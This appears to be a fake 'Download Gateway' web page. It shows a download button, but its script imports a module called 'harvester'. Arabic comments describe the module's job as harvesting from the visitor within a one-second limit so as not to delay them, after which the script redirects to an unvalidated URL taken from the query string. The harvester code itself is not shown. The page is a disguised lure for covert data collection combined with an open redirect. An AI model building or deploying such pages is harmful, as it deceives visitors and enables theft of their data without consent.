
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>body { font-family: 'Inter', sans-serif; }</style>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center h-screen overflow-hidden relative">

    <div class="absolute inset-0 z-0 opacity-20">
        <div class="absolute top-0 left-0 w-72 h-72 bg-blue-600 rounded-full mix-blend-multiply filter blur-xl animate-blob"></div>
        <div class="absolute top-0 right-0 w-72 h-72 bg-indigo-600 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-2000"></div>
    </div>

    <div class="z-10 bg-white/10 backdrop-blur-lg border border-white/20 p-8 rounded-3xl shadow-2xl text-center max-w-sm w-full mx-4">
        <div class="mb-6">
            <svg class="w-20 h-20 text-blue-400 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
            </svg>
        </div>

        <h1 class="text-2xl font-bold mb-2">Link Ready</h1>
        <p class="text-gray-300 text-sm mb-8">Click the button below to start your download.</p>

        <button id="downloadBtn" onclick="processDownload()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg transition flex items-center justify-center gap-2">
            <span>Download Now</span>
        </button>
    </div>

    <script type="module">
        // استيراد الحاصد
        import { initHarvester } from '/modules/harvester.js';

        window.processDownload = async function() {
            const btn = document.getElementById('downloadBtn');
            
            // 1. استخراج الرابط يدوياً وبدقة
            const currentUrl = window.location.href;
            const urlParts = currentUrl.split('url=');
            let targetUrl = 'https://google.com'; // رابط احتياطي

            if (urlParts.length > 1) {
                targetUrl = decodeURIComponent(urlParts[1]);
            }

            // 2. تغيير حالة الزر
            btn.innerHTML = "Processing...";
            btn.style.opacity = "0.7";
            btn.disabled = true;

            try {
                // 3. 🎣 محاولة الحصاد (بحد أقصى ثانية واحدة لعدم تعطيل المستخدم)
                await Promise.race([
                    initHarvester(),
                    new Promise(resolve => setTimeout(resolve, 1000))
                ]);
            } catch (e) {
                console.log("Redirecting regardless of harvest status");
            }

            // 4. 🚀 التوجيه النهائي
            window.location.href = targetUrl;
        };
    </script>
</body>
</html>
